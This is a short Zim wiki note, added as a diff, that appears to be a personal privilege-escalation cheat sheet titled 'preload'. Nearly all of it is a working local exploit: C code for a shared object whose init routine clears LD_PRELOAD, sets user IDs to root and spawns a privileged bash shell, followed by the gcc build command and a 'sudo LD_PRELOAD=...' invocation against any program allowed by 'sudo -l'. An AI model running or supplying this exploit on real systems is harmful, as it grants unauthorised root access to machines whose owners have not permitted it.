@@ -1,0 +1,24 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-19T05:31:56-04:00
+
+====== preload ======
+Created Tuesday 19 May 2020
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+		unsetenv("LD_PRELOAD");
+		setresuid(0,0,0);
+		system("/bin/bash -p");
+}
+----save this in preload.c
+----Create a shared object using the code located at /home/user/preload.c:
+
+---gcc -fPIC -shared -nostartfiles -o /tmp/preload.so [[/home/user/tools/sudo/preload.c]]
+
+--sudo LD_PRELOAD=/tmp/preload.so {program-name-here}
+
+---program-name-here== any program results from sudo -l
